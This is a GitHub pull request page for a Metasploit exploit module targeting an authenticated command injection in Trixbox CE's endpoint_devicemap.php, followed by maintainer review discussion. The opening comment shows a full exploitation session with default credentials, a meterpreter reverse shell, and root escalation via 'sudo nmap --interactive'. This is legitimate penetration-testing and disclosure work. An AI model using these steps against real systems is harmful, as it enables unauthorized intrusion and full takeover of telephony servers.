  + [Nonprofits](/solutions/industry/nonprofits)
  By use case
  + [DevSecOps](/solutions/use-case/devsecops)
  + [DevOps](/solutions/use-case/devops)
  + [CI/CD](/solutions/use-case/ci-cd)
  + [View all use cases](/solutions/use-case)

  By industry
  + [Healthcare](/solutions/industry/healthcare)
  + [Financial services](/solutions/industry/financial-services)
  + [Manufacturing](/solutions/industry/manufacturing)
  + [Government](/solutions/industry/government)
  + [View all industries](/solutions/industry)

  [View all solutions](/solutions)
* Resources

  Topics
  + [AI](/resources/articles/ai)
  + [DevOps](/resources/articles/devops)
  + [Security](/resources/articles/security)
  + [Software Development](/resources/articles/software-development)
  + [View all](/resources/articles)

  Explore
  + [Learning Pathways](https://resources.github.com/learn/pathways)
  + [White papers, Ebooks, Webinars](https://resources.github.com)
  + [Customer Stories](https://github.com/customer-stories)
  + [Partners](https://partner.github.com)
  + [Executive Insights](https://github.com/solutions/executive-insights)
* Open Source

  + [GitHub Sponsors
    Fund open source developers](/sponsors)
  + [The ReadME Project
    GitHub community articles](https://github.com/readme)
  Repositories
  + [Topics](https://github.com/topics)
  + [Trending](https://github.com/trending)
  + [Collections](https://github.com/collections)
* Enterprise

  + [Enterprise platform
    AI-powered developer platform](/enterprise)
  Available add-ons
  + [Advanced Security
    Enterprise-grade security features](https://github.com/enterprise/advanced-security)
  + [GitHub Copilot
    Enterprise-grade AI features](/features/copilot#enterprise)
  + [Premium Support
    Enterprise-grade 24/7 support](/premium-support)
* [Pricing](https://github.com/pricing)

Search or jump to...

# Search code, repositories, users, issues, pull requests...

Search

Clear

[Search syntax tips](https://docs.github.com/search-github/github-code-search/understanding-github-code-search-syntax)

# Provide feedback

We read every piece of feedback, and take your input very seriously.

Include my email address so I can be contacted

  Cancel

 Submit feedback

# Saved searches

## Use saved searches to filter your results more quickly

Name

Query

To see all available qualifiers, see our [documentation](https://docs.github.com/search-github/github-code-search/understanding-github-code-search-syntax).

  Cancel

 Create saved search

[Sign in](/login?return_to=https%3A%2F%2Fgithub.com%2Frapid7%2Fmetasploit-framework%2Fpull%2F13353)

[Sign up](/signup?ref_cta=Sign+up&ref_loc=header+logged+out&ref_page=%2F%3Cuser-name%3E%2F%3Crepo-name%3E%2Fvoltron%2Fpull_requests_fragments%2Fpull_request_layout&source=header-repo&source_repo=rapid7%2Fmetasploit-framework)
Reseting focus

You signed in with another tab or window. Reload to refresh your session.
You signed out in another tab or window. Reload to refresh your session.
You switched accounts on another tab or window. Reload to refresh your session.

Dismiss alert

{{ message }}

[rapid7](/rapid7)
/
**[metasploit-framework](/rapid7/metasploit-framework)**
Public

* [Notifications](/login?return_to=%2Frapid7%2Fmetasploit-framework) You must be signed in to change notification settings
* [Fork
  14.1k](/login?return_to=%2Frapid7%2Fmetasploit-framework)
* [Star
   34.6k](/login?return_to=%2Frapid7%2Fmetasploit-framework)

* [Code](/rapid7/metasploit-framework)
* [Issues
  410](/rapid7/metasploit-framework/issues)
* [Pull requests
  37](/rapid7/metasploit-framework/pulls)
* [Discussions](/rapid7/metasploit-framework/discussions)
* [Actions](/rapid7/metasploit-framework/actions)
* [Projects
  1](/rapid7/metasploit-framework/projects)
* [Wiki](/rapid7/metasploit-framework/wiki)
* [Security](/rapid7/metasploit-framework/security)
* [Insights](/rapid7/metasploit-framework/pulse)

Additional navigation options

* [Code](/rapid7/metasploit-framework)
* [Issues](/rapid7/metasploit-framework/issues)
* [Pull requests](/rapid7/metasploit-framework/pulls)
* [Discussions](/rapid7/metasploit-framework/discussions)
* [Actions](/rapid7/metasploit-framework/actions)
* [Projects](/rapid7/metasploit-framework/projects)
* [Wiki](/rapid7/metasploit-framework/wiki)
* [Security](/rapid7/metasploit-framework/security)
* [Insights](/rapid7/metasploit-framework/pulse)

New issue

**Have a question about this project?** Sign up for a free GitHub account to open an issue and contact its maintainers and the community.

 [Sign up for GitHub](/signup?return_to=%2Frapid7%2Fmetasploit-framework%2Fissues%2Fnew%2Fchoose)

By clicking “Sign up for GitHub”, you agree to our [terms of service](https://docs.github.com/terms) and
[privacy statement](https://docs.github.com/privacy). We’ll occasionally send you account related emails.

Already on GitHub?
[Sign in](/login?return_to=%2Frapid7%2Fmetasploit-framework%2Fissues%2Fnew%2Fchoose)
to your account

[Jump to bottom](#issue-comment-box)

# Trixbox CE v2.8.0.4 endpoint\_devicemap.php Authenticated Remote Command Execution #13353

 Merged

[gwillcox-r7](/gwillcox-r7)
merged 1 commit into
[rapid7:master](/rapid7/metasploit-framework/tree/master "rapid7/metasploit-framework:master")
from
stasinopoulos:patch-1

May 4, 2020

 Merged

# [Trixbox CE v2.8.0.4 endpoint\_devicemap.php Authenticated Remote Command Execution](#top) #13353

[gwillcox-r7](/gwillcox-r7)
merged 1 commit into
[rapid7:master](/rapid7/metasploit-framework/tree/master "rapid7/metasploit-framework:master")
from
stasinopoulos:patch-1

May 4, 2020

[Conversation
313](/rapid7/metasploit-framework/pull/13353)
[Commits
1](/rapid7/metasploit-framework/pull/13353/commits)
[Checks
0](/rapid7/metasploit-framework/pull/13353/checks)
[Files changed](/rapid7/metasploit-framework/pull/13353/files)

## Conversation

This file contains bidirectional Unicode text that may be interpreted or compiled differently than what appears below. To review, open the file in an editor that reveals hidden Unicode characters.
[Learn more about bidirectional Unicode characters](https://github.co/hiddenchars)

  [Show hidden characters](%7B%7B%20revealButtonHref%20%7D%7D)

[![stasinopoulos](https://avatars.githubusercontent.com/u/5289251?s=60&v=4)](/stasinopoulos)

Copy link

Contributor

### @stasinopoulos **[stasinopoulos](/stasinopoulos)** commented [Apr 28, 2020](#issue-608363150) • edited Loading

This module exploits an authenticated OS command injection vulnerability found in TrixBox CE version 1.2.0 to 2.8.0.4 inclusive in the `network` POST parameter of the `/maint/modules/endpointcfg/endpoint_devicemap.php` page. Successful exploitation allows for arbitrary command execution on the underlying operating system as the `asterisk` user.

#### Example Usage

```
msf5 > use exploit/unix/webapp/trixbox_ce_endpoint_devicemap_rce
msf5 exploit(unix/webapp/trixbox_ce_endpoint_devicemap_rce) > set rhosts 192.168.1.8
rhosts => 192.168.1.8
msf5 exploit(unix/webapp/trixbox_ce_endpoint_devicemap_rce) > show options

Module options (exploit/unix/webapp/trixbox_ce_endpoint_devicemap_rce):

   Name          Current Setting  Required  Description
   ----          ---------------  --------  -----------
   HttpPassword  password         yes       Password to login with
   HttpUsername  maint            yes       User to login with
   Proxies                        no        A proxy chain of format type:host:port[,type:host:port][...]
   RHOSTS        192.168.1.8      yes       The target host(s), range CIDR identifier, or hosts file with syntax 'file:<path>'
   RPORT         80               yes       The target port (TCP)
   SRVHOST       0.0.0.0          yes       The local host to listen on. This must be an address on the local machine or 0.0.0.0
   SRVPORT       8080             yes       The local port to listen on.
   SSL           false            no        Negotiate SSL/TLS for outgoing connections
   SSLCert                        no        Path to a custom SSL certificate (default is randomly generated)
   URIPATH                        no        The URI to use for this exploit (default is random)
   VHOST                          no        HTTP server virtual host

Payload options (linux/x86/meterpreter/reverse_tcp):

   Name   Current Setting  Required  Description
   ----   ---------------  --------  -----------
   LHOST                   yes       The listen address (an interface may be specified)
   LPORT  4444             yes       The listen port

Exploit target:

   Id  Name
   --  ----
   0   Automatic (Linux Dropper)

msf5 exploit(unix/webapp/trixbox_ce_endpoint_devicemap_rce) > set lhost 192.168.1.10
lhost => 192.168.1.10
msf5 exploit(unix/webapp/trixbox_ce_endpoint_devicemap_rce) > exploit

[*] Started reverse TCP handler on 192.168.1.10:4444
[*] 192.168.1.8:80 - Authenticating using "maint:password" credentials...
[+] 192.168.1.8:80 - Authenticated successfully.
[+] 192.168.1.8:80 - Trixbox CE v2.8.0.4 identified.
[*] 192.168.1.8:80 - Sending payload (150 bytes)...
[*] Sending stage (980808 bytes) to 192.168.1.8
[*] Meterpreter session 1 opened (192.168.1.10:4444 -> 192.168.1.8:38680) at 2020-05-02 03:55:24 -0400
[*] Command Stager progress - 100.00% done (799/799 bytes)

meterpreter > sysinfo
Computer     : trixbox1.localdomain
OS           : CentOS 5.5 (Linux 2.6.18-164.11.1.el5)
Architecture : i686
BuildTuple   : i486-linux-musl
Meterpreter  : x86/linux
meterpreter > shell
Process 9259 created.
Channel 1 created.
id
uid=100(asterisk) gid=101(asterisk) groups=101(asterisk)
whoami
asterisk

```

Once a shell has been gained as the `asterisk` user, attackers can elevate their privileges to `root` by executing the following commands:

```
sudo nmap --interactive

Starting Nmap V. 4.76 ( http://nmap.org )
Welcome to Interactive Mode -- press h <enter> for help
nmap> !sh
id
uid=0(root) gid=0(root) groups=0(root),1(bin),2(daemon),3(sys),4(adm),6(disk),10(wheel)

```

Sorry, something went wrong.

All reactions

[![@gwillcox-r7](https://avatars.githubusercontent.com/u/63261883?s=40&u=1144db3aa7b18a30fe7e7d91e1161aa11a819bfd&v=4)](/gwillcox-r7)
[gwillcox-r7](/gwillcox-r7)
added
the
[needs-docs](/rapid7/metasploit-framework/labels/needs-docs)
label
[Apr 28, 2020](#event-3280611716)

[![@label-actions](https://avatars.githubusercontent.com/in/24092?s=80&v=4)](/apps/label-actions)

Copy link

### **[label-actions](/apps/label-actions) bot** commented [Apr 28, 2020](#issuecomment-620645086)

| Thanks for your pull request! Before this can be merged, we need the following documentation for your module:   * [Writing Module Documentation](https://github.com/rapid7/metasploit-framework/wiki/Writing-Module-Documentation) * [Template](https://github.com/rapid7/metasploit-framework/blob/master/documentation/modules/module_doc_template.md) * [Examples](https://github.com/rapid7/metasploit-framework/tree/master/documentation/modules) |
| --- |

All reactions

Sorry, something went wrong.

[![@gwillcox-r7](https://avatars.githubusercontent.com/u/63261883?s=80&u=1144db3aa7b18a30fe7e7d91e1161aa11a819bfd&v=4)](/gwillcox-r7)

Copy link

Contributor

### **[gwillcox-r7](/gwillcox-r7)** commented [Apr 28, 2020](#issuecomment-620647142)

| [@stasinopoulos](https://github.com/stasinopoulos) Thank you for this submission; it looks very well done and we appreciate the level of detail put into this! Only thing I will need before I can start testing this is some additional documentation details as per the bot's instructions above. Please follow the directions in those links and make sure to pay particular attention to the instructions where it asks you to describe how you set up the environment step by step (don't just say "grab version 1.1 and then run the exploit"; we need to know how you set it up step by step) and how you obtained the vulnerable version (download site, ftp site, etc).  Thanks again and let me know if you have any questions and I'll be happy to assist! |
| --- |

All reactions

Sorry, something went wrong.

[![@stasinopoulos](https://avatars.githubusercontent.com/u/5289251?s=40&u=88dc2df1857e6c8926dcbfc8048901d4ade830cf&v=4)](/stasinopoulos)
[stasinopoulos](/stasinopoulos)
mentioned this pull request
[Apr 28, 2020](#ref-pullrequest-608393485)

[Added documentation regarding Trixbox CE <= v2.8.0.4 Authenticated RCE
#13354](/rapid7/metasploit-framework/pull/13354)
 Closed

[![@stasinopoulos](https://avatars.githubusercontent.com/u/5289251?s=80&u=88dc2df1857e6c8926dcbfc8048901d4ade830cf&v=4)](/stasinopoulos)

Copy link

Contributor

Author

### **[stasinopoulos](/stasinopoulos)** commented [Apr 28, 2020](#issuecomment-620676329)

| [@gwillcox-r7](https://github.com/gwillcox-r7) thanks for your prompt response. Kindly confirm that the provided documentation is fine. |
| --- |

All reactions

Sorry, something went wrong.

[![@gwillcox-r7](https://avatars.githubusercontent.com/u/63261883?s=80&u=1144db3aa7b18a30fe7e7d91e1161aa11a819bfd&v=4)](/gwillcox-r7)

Copy link

Contributor

### **[gwillcox-r7](/gwillcox-r7)** commented [Apr 28, 2020](#issuecomment-620699797) • edited Loading

| [@stasinopoulos](https://github.com/stasinopoulos) Please add your documentation as a separate commit to this branch rather than opening up a new branch. Commit to your local branch `patch-1`, then push your changes up to your fork of `metasploit-framework`.  So:   1. `git checkout patch-1` 2. `nano documentation/modules/exploit/unix/webapp/trixbox_ce_auth_rce.md` 3. `git add documentation/modules/exploit/unix/webapp/trixbox_ce_auth_rce.md` 4. Add changes at this point to the file to add documentation 5. `git commit -m "Adding in trixbox documentation"` 6. `git push origin master` |
| --- |

All reactions

Sorry, something went wrong.

[![@stasinopoulos](https://avatars.githubusercontent.com/u/5289251?s=80&u=88dc2df1857e6c8926dcbfc8048901d4ade830cf&v=4)](/stasinopoulos)

Copy link

Contributor

Author

### **[stasinopoulos](/stasinopoulos)** commented [Apr 28, 2020](#issuecomment-620755934)

| [@gwillcox-r7](https://github.com/gwillcox-r7) Done n' sorry for the mess :P |
| --- |

 👍
1
 gwillcox-r7 reacted with thumbs up emoji

All reactions

* 👍
  1 reaction

Sorry, something went wrong.

[![gwillcox-r7](https://avatars.githubusercontent.com/u/63261883?s=60&v=4)](/gwillcox-r7)

**[gwillcox-r7](/gwillcox-r7)**
reviewed
[Apr 28, 2020](#pullrequestreview-402140344)

 [View reviewed changes](/rapid7/metasploit-framework/pull/13353/files)

[modules/exploits/unix/webapp/trixbox\_ce\_auth\_rce.rb](/rapid7/metasploit-framework/pull/13353/files#diff-c5b2d7822963327b13552690b35df48cf4af1de80ce73fddd86c8c9ec6475607)
Outdated

Show resolved

Hide resolved

[modules/exploits/unix/webapp/trixbox\_ce\_auth\_rce.rb](/rapid7/metasploit-framework/pull/13353/files#diff-c5b2d7822963327b13552690b35df48cf4af1de80ce73fddd86c8c9ec6475607)
Outdated

Show resolved

Hide resolved

[![@gwillcox-r7](https://avatars.githubusercontent.com/u/63261883?s=80&u=1144db3aa7b18a30fe7e7d91e1161aa11a819bfd&v=4)](/gwillcox-r7)

Copy link

Contributor

### **[gwillcox-r7](/gwillcox-r7)** commented [Apr 28, 2020](#issuecomment-620805943)

| No problem [@stasinopoulos](https://github.com/stasinopoulos), all part of the learning experience :) |
| --- |

All reactions

Sorry, something went wrong.

[![@gwillcox-r7](https://avatars.githubusercontent.com/u/63261883?s=40&u=1144db3aa7b18a30fe7e7d91e1161aa11a819bfd&v=4)](/gwillcox-r7)
[gwillcox-r7](/gwillcox-r7)
removed
the
[needs-docs](/rapid7/metasploit-framework/labels/needs-docs)
label
[Apr 28, 2020](#event-3281783860)

[![@gwillcox-r7](https://avatars.githubusercontent.com/u/63261883?s=40&u=1144db3aa7b18a30fe7e7d91e1161aa11a819bfd&v=4)](/gwillcox-r7)
[gwillcox-r7](/gwillcox-r7)
self-assigned this
[Apr 28, 2020](#event-3281783965)

[![@adfoster-r7](https://avatars.githubusercontent.com/u/60357436?s=40&v=4)](/adfoster-r7)
[adfoster-r7](/adfoster-r7)
added
the
[needs-linting](/rapid7/metasploit-framework/labels/needs-linting)
The module needs additional work to pass our automated linting rules
label
[Apr 28, 2020](#event-3281804376)

[![@label-actions](https://avatars.githubusercontent.com/in/24092?s=80&v=4)](/apps/label-actions)

Copy link

### **[label-actions](/apps/label-actions) bot** commented [Apr 28, 2020](#issuecomment-620809062)

| Thanks for your pull request! Before this pull request can be merged, it must pass the checks of our automated linting tools.  We use Rubocop and msftidy to ensure the quality of our code. This can be ran from the root directory of Metasploit:  ``` rubocop <directory or file> tools/dev/msftidy.rb <directory or file>  ```  You can automate most of these changes with the `-a` flag:  ``` rubocop -a <directory or file>  ```  Please update your branch after these have been made, and reach out if you have any problems. |
| --- |

All reactions

Sorry, something went wrong.

[![@stasinopoulos](https://avatars.githubusercontent.com/u/5289251?s=40&u=88dc2df1857e6c8926dcbfc8048901d4ade830cf&v=4)](/stasinopoulos)
[stasinopoulos](/stasinopoulos)
changed the title
~~Trixbox CE <= v2.8.0.4 Authenticated RCE~~
Trixbox CE v2.8.0.4 Authenticated RCE
[Apr 28, 2020](#event-3281937509)

[![gwillcox-r7](https://avatars.githubusercontent.com/u/63261883?s=60&v=4)](/gwillcox-r7)

**[gwillcox-r7](/gwillcox-r7)**
suggested changes
[Apr 28, 2020](#pullrequestreview-402176145)

 [View reviewed changes](/rapid7/metasploit-framework/pull/13353/files)

[documentation/modules/exploit/unix/webapp/trixbox\_ce\_auth\_rce.md](/rapid7/metasploit-framework/pull/13353/files#diff-4e75707de5833ae384317100e6a86c2cb4bca44742f91232c75d89edf1933f3d)
Outdated

Show resolved

Hide resolved

[documentation/modules/exploit/unix/webapp/trixbox\_ce\_auth\_rce.md](/rapid7/metasploit-framework/pull/13353/files#diff-4e75707de5833ae384317100e6a86c2cb4bca44742f91232c75d89edf1933f3d)
Outdated

Show resolved

Hide resolved

[documentation/modules/exploit/unix/webapp/trixbox\_ce\_auth\_rce.md](/rapid7/metasploit-framework/pull/13353/files#diff-4e75707de5833ae384317100e6a86c2cb4bca44742f91232c75d89edf1933f3d)
Outdated

Show resolved

Hide resolved

[modules/exploits/unix/webapp/trixbox\_ce\_auth\_rce.rb](/rapid7/metasploit-framework/pull/13353/files#diff-c5b2d7822963327b13552690b35df48cf4af1de80ce73fddd86c8c9ec6475607)
Outdated

Show resolved

Hide resolved

[modules/exploits/unix/webapp/trixbox\_ce\_auth\_rce.rb](/rapid7/metasploit-framework/pull/13353/files#diff-c5b2d7822963327b13552690b35df48cf4af1de80ce73fddd86c8c9ec6475607)
Outdated

Show resolved

Hide resolved

[modules/exploits/unix/webapp/trixbox\_ce\_auth\_rce.rb](/rapid7/metasploit-framework/pull/13353/files#diff-c5b2d7822963327b13552690b35df48cf4af1de80ce73fddd86c8c9ec6475607)
Outdated

Show resolved

Hide resolved

[![@gwillcox-r7](https://avatars.githubusercontent.com/u/63261883?s=80&u=1144db3aa7b18a30fe7e7d91e1161aa11a819bfd&v=4)](/gwillcox-r7)

Copy link

Contributor

### **[gwillcox-r7](/gwillcox-r7)** commented [Apr 28, 2020](#issuecomment-620831332)

| [@stasinopoulos](https://github.com/stasinopoulos) Please also run `rubocop -a modules/exploits/unix/webapp/trixbox_ce_auth_rce.rb` and commit and upload the changes that it makes. |
| --- |

All reactions

Sorry, something went wrong.

[![@stasinopoulos](https://avatars.githubusercontent.com/u/5289251?s=40&u=88dc2df1857e6c8926dcbfc8048901d4ade830cf&v=4)](/stasinopoulos)
[stasinopoulos](/stasinopoulos)
changed the title
~~Trixbox CE v2.8.0.4 Authenticated RCE~~
Trixbox CE v2.8.0.4 (and prior versions) Authenticated RCE
[Apr 28, 2020](#event-3282048501)

[![@bcoles](https://avatars.githubusercontent.com/u/434827?s=40&u=1fe0601f243e1627c6f738027d2e71b90dad989d&v=4)](/bcoles)
[bcoles](/bcoles)
added
the
[module](/rapid7/metasploit-framework/labels/module)
label
[Apr 28, 2020](#event-3282190229)

[![bcoles](https://avatars.githubusercontent.com/u/434827?s=60&v=4)](/bcoles)

**[bcoles](/bcoles)**
reviewed
[Apr 28, 2020](#pullrequestreview-402229968)

 [View reviewed changes](/rapid7/metasploit-framework/pull/13353/files)

[modules/exploits/unix/webapp/trixbox\_ce\_auth\_rce.rb](/rapid7/metasploit-framework/pull/13353/files#diff-c5b2d7822963327b13552690b35df48cf4af1de80ce73fddd86c8c9ec6475607)
Outdated

Show resolved

Hide resolved

[![bcoles](https://avatars.githubusercontent.com/u/434827?s=60&v=4)](/bcoles)

**[bcoles](/bcoles)**
reviewed
[Apr 28, 2020](#pullrequestreview-402230155)

 [View reviewed changes](/rapid7/metasploit-framework/pull/13353/files)

[modules/exploits/unix/webapp/trixbox\_ce\_auth\_rce.rb](/rapid7/metasploit-framework/pull/13353/files#diff-c5b2d7822963327b13552690b35df48cf4af1de80ce73fddd86c8c9ec6475607)
Outdated

Show resolved

Hide resolved

[![bcoles](https://avatars.githubusercontent.com/u/434827?s=60&v=4)](/bcoles)

**[bcoles](/bcoles)**
reviewed
[Apr 28, 2020](#pullrequestreview-402230500)

 [View reviewed changes](/rapid7/metasploit-framework/pull/13353/files)

[modules/exploits/unix/webapp/trixbox\_ce\_auth\_rce.rb](/rapid7/metasploit-framework/pull/13353/files#diff-c5b2d7822963327b13552690b35df48cf4af1de80ce73fddd86c8c9ec6475607)
Outdated

Show resolved

Hide resolved

[![bcoles](https://avatars.githubusercontent.com/u/434827?s=60&v=4)](/bcoles)

**[bcoles](/bcoles)**
reviewed
[Apr 28, 2020](#pullrequestreview-402230838)

 [View reviewed changes](/rapid7/metasploit-framework/pull/13353/files)

[modules/exploits/unix/webapp/trixbox\_ce\_auth\_rce.rb](/rapid7/metasploit-framework/pull/13353/files#diff-c5b2d7822963327b13552690b35df48cf4af1de80ce73fddd86c8c9ec6475607)
Outdated

Show resolved

Hide resolved

[![@stasinopoulos](https://avatars.githubusercontent.com/u/5289251?s=40&u=88dc2df1857e6c8926dcbfc8048901d4ade830cf&v=4)](/stasinopoulos)
[stasinopoulos](/stasinopoulos)
changed the title
~~Trixbox CE v2.8.0.4 (and prior versions) Authenticated RCE~~
Trixbox CE v2.8.0.4 endpoint\_devicemap.php Authenticated Remote Command Execution
[Apr 28, 2020](#event-3282327731)

[![gwillcox-r7](https://avatars.githubusercontent.com/u/63261883?s=60&v=4)](/gwillcox-r7)

**[gwillcox-r7](/gwillcox-r7)**
suggested changes
[Apr 28, 2020](#pullrequestreview-402230663)

 [View reviewed changes](/rapid7/metasploit-framework/pull/13353/files)

Copy link

Contributor

### @gwillcox-r7 **[gwillcox-r7](/gwillcox-r7)** left a comment

There was a problem hiding this comment.

### Choose a reason for hiding this comment

The reason will be displayed to describe this comment to others. [Learn more](https://docs.github.com/articles/managing-disruptive-comments/#hiding-a-comment).

Choose a reason

Spam
Abuse
Off Topic
Outdated
Duplicate
Resolved

Hide comment

Please incorporate [@bcoles](https://github.com/bcoles)'s changes and add these ones in as well.

Sorry, something went wrong.

All reactions

[modules/exploits/unix/webapp/trixbox\_ce\_auth\_rce.rb](/rapid7/metasploit-framework/pull/13353/files#diff-c5b2d7822963327b13552690b35df48cf4af1de80ce73fddd86c8c9ec6475607)
Outdated

Show resolved

Hide resolved

[modules/exploits/unix/webapp/trixbox\_ce\_auth\_rce.rb](/rapid7/metasploit-framework/pull/13353/files#diff-c5b2d7822963327b13552690b35df48cf4af1de80ce73fddd86c8c9ec6475607)
Outdated

Show resolved

Hide resolved

[documentation/modules/exploit/unix/webapp/trixbox\_ce\_auth\_rce.md](/rapid7/metasploit-framework/pull/13353/files#diff-4e75707de5833ae384317100e6a86c2cb4bca44742f91232c75d89edf1933f3d)
Outdated

Show resolved

Hide resolved

[documentation/modules/exploit/unix/webapp/trixbox\_ce\_auth\_rce.md](/rapid7/metasploit-framework/pull/13353/files#diff-4e75707de5833ae384317100e6a86c2cb4bca44742f91232c75d89edf1933f3d)
Outdated

Show resolved

Hide resolved

[documentation/modules/exploit/unix/webapp/trixbox\_ce\_auth\_rce.md](/rapid7/metasploit-framework/pull/13353/files#diff-4e75707de5833ae384317100e6a86c2cb4bca44742f91232c75d89edf1933f3d)
Outdated

Show resolved

Hide resolved

[documentation/modules/exploit/unix/webapp/trixbox\_ce\_auth\_rce.md](/rapid7/metasploit-framework/pull/13353/files#diff-4e75707de5833ae384317100e6a86c2cb4bca44742f91232c75d89edf1933f3d)
Outdated

Show resolved

Hide resolved

[documentation/modules/exploit/unix/webapp/trixbox\_ce\_auth\_rce.md](/rapid7/metasploit-framework/pull/13353/files#diff-4e75707de5833ae384317100e6a86c2cb4bca44742f91232c75d89edf1933f3d)
Outdated

Show resolved

Hide resolved

[modules/exploits/unix/webapp/trixbox\_ce\_auth\_rce.rb](/rapid7/metasploit-framework/pull/13353/files#diff-c5b2d7822963327b13552690b35df48cf4af1de80ce73fddd86c8c9ec6475607)
Outdated

Show resolved

Hide resolved

[modules/exploits/unix/webapp/trixbox\_ce\_auth\_rce.rb](/rapid7/metasploit-framework/pull/13353/files#diff-c5b2d7822963327b13552690b35df48cf4af1de80ce73fddd86c8c9ec6475607)
Outdated

Show resolved

Hide resolved

[modules/exploits/unix/webapp/trixbox\_ce\_auth\_rce.rb](/rapid7/metasploit-framework/pull/13353/files#diff-c5b2d7822963327b13552690b35df48cf4af1de80ce73fddd86c8c9ec6475607)
Outdated

Show resolved

Hide resolved

[![bcoles](https://avatars.githubusercontent.com/u/434827?s=60&v=4)](/bcoles)

**[bcoles](/bcoles)**
reviewed
[Apr 29, 2020](#pullrequestreview-402411314)

 [View reviewed changes](/rapid7/metasploit-framework/pull/13353/files)

[modules/exploits/unix/webapp/trixbox\_ce\_endpoint\_devicemap\_rce.rb](/rapid7/metasploit-framework/pull/13353/files#diff-5337984bf7949a74c277be18046b7f71ec3e2dedadebaf8ac3984981edc46b72)
Outdated

Show resolved

Hide resolved

[modules/exploits/unix/webapp/trixbox\_ce\_endpoint\_devicemap\_rce.rb](/rapid7/metasploit-framework/pull/13353/files#diff-5337984bf7949a74c277be18046b7f71ec3e2dedadebaf8ac3984981edc46b72)
Outdated

Show resolved

Hide resolved

[modules/exploits/unix/webapp/trixbox\_ce\_endpoint\_devicemap\_rce.rb](/rapid7/metasploit-framework/pull/13353/files#diff-5337984bf7949a74c277be18046b7f71ec3e2dedadebaf8ac3984981edc46b72)
Outdated

Show resolved

Hide resolved

[![bcoles](https://avatars.githubusercontent.com/u/434827?s=60&v=4)](/bcoles)

**[bcoles](/bcoles)**
reviewed
[Apr 29, 2020](#pullrequestreview-402464043)

 [View reviewed changes](/rapid7/metasploit-framework/pull/13353/files)

[modules/exploits/unix/webapp/trixbox\_ce\_endpoint\_devicemap\_rce.rb](/rapid7/metasploit-framework/pull/13353/files#diff-5337984bf7949a74c277be18046b7f71ec3e2dedadebaf8ac3984981edc46b72)
Outdated

Show resolved

Hide resolved

[![bcoles](https://avatars.githubusercontent.com/u/434827?s=60&v=4)](/bcoles)

**[bcoles](/bcoles)**
reviewed
[Apr 29, 2020](#pullrequestreview-402465941)

 [View reviewed changes](/rapid7/metasploit-framework/pull/13353/files)

[modules/exploits/unix/webapp/trixbox\_ce\_endpoint\_devicemap\_rce.rb](/rapid7/metasploit-framework/pull/13353/files#diff-5337984bf7949a74c277be18046b7f71ec3e2dedadebaf8ac3984981edc46b72)
Outdated

Show resolved

Hide resolved

[![@bcoles](https://avatars.githubusercontent.com/u/434827?s=40&u=1fe0601f243e1627c6f738027d2e71b90dad989d&v=4)](/bcoles)
[bcoles](/bcoles)
removed
the
[needs-linting](/rapid7/metasploit-framework/labels/needs-linting)
The module needs additional work to pass our automated linting rules
label
[Apr 29, 2020](#event-3283689662)

[![bcoles](https://avatars.githubusercontent.com/u/434827?s=60&v=4)](/bcoles)

**[bcoles](/bcoles)**
reviewed
[Apr 29, 2020](#pullrequestreview-402523371)

 [View reviewed changes](/rapid7/metasploit-framework/pull/13353/files)

[modules/exploits/unix/webapp/trixbox\_ce\_endpoint\_devicemap\_rce.rb](/rapid7/metasploit-framework/pull/13353/files#diff-5337984bf7949a74c277be18046b7f71ec3e2dedadebaf8ac3984981edc46b72)
Outdated

Show resolved

Hide resolved

[modules/exploits/unix/webapp/trixbox\_ce\_endpoint\_devicemap\_rce.rb](/rapid7/metasploit-framework/pull/13353/files#diff-5337984bf7949a74c277be18046b7f71ec3e2dedadebaf8ac3984981edc46b72)
Outdated

Show resolved

Hide resolved

[modules/exploits/unix/webapp/trixbox\_ce\_endpoint\_devicemap\_rce.rb](/rapid7/metasploit-framework/pull/13353/files#diff-5337984bf7949a74c277be18046b7f71ec3e2dedadebaf8ac3984981edc46b72)
Outdated

Show resolved

Hide resolved

[modules/exploits/unix/webapp/trixbox\_ce\_endpoint\_devicemap\_rce.rb](/rapid7/metasploit-framework/pull/13353/files#diff-5337984bf7949a74c277be18046b7f71ec3e2dedadebaf8ac3984981edc46b72)
Outdated

Show resolved

Hide resolved

[modules/exploits/unix/webapp/trixbox\_ce\_endpoint\_devicemap\_rce.rb](/rapid7/metasploit-framework/pull/13353/files#diff-5337984bf7949a74c277be18046b7f71ec3e2dedadebaf8ac3984981edc46b72)
Outdated

|  |  | unless res |
| --- | --- | --- |
|  |  | return CheckCode::Unknown('Connection failed') |
|  |  | end |
|  |  | unless res.body.include?(fingerprint) |

Copy link

Contributor

### @bcoles **[bcoles](/bcoles)** [Apr 29, 2020](#discussion_r417201320)

There was a problem hiding this comment.

### Choose a reason for hiding this comment

The reason will be displayed to describe this comment to others. [Learn more](https://docs.github.com/articles/managing-disruptive-comments/#hiding-a-comment).

Choose a reason

Spam
Abuse
Off Topic
Outdated
Duplicate
Resolved

Hide comment

It might be a good idea to also include an authentication check, ie:

```
if res.code == 401
  return CheckCode::Unknown('Authentication Failed')
end
```

Sorry, something went wrong.

All reactions

Copy link

Contributor

### @gwillcox-r7 **[gwillcox-r7](/gwillcox-r7)** [Apr 30, 2020](#discussion_r418206680)

There was a problem hiding this comment.

### Choose a reason for hiding this comment

The reason will be displayed to describe this comment to others. [Learn more](https://docs.github.com/articles/managing-disruptive-comments/#hiding-a-comment).

Choose a reason

Spam
Abuse
Off Topic
Outdated
Duplicate
Resolved

Hide comment

[@stasinopoulos](https://github.com/stasinopoulos), I'm not sure if you fixed this issue, as your current code is assuming that if the target failed to respond with a 200 OK code that authentication failed. I think what [@bcoles](https://github.com/bcoles) is trying to say is that usually a server returns a 401 error code or something similar if you weren't able to log in successfully. So your current check might state that authentication failed when this was not the case.

Also in future can you please wait for [@bcoles](https://github.com/bcoles) or myself to mark an issue as resolved? This will prevent any confusion as to whether or not an issue is actually complete or if it needs further work.

[@bcoles](https://github.com/bcoles) Can you confirm things here are as you would like to see them?

Sorry, something went wrong.

All reactions

[![@stasinopoulos](https://avatars.githubusercontent.com/u/5289251?s=80&u=88dc2df1857e6c8926dcbfc8048901d4ade830cf&v=4)](/stasinopoulos)

Copy link

Contributor

Author

### **[stasinopoulos](/stasinopoulos)** commented [Apr 29, 2020](#issuecomment-621174011)

| [@gwillcox-r7](https://github.com/gwillcox-r7) [@bcoles](https://github.com/bcoles) are we ok for the merge of that module (btw thanks for your support)? |
| --- |

All reactions

Sorry, something went wrong.

48 hidden items

Load more…

[![gwillcox-r7](https://avatars.githubusercontent.com/u/63261883?s=60&v=4)](/gwillcox-r7)

**[gwillcox-r7](/gwillcox-r7)**
reviewed
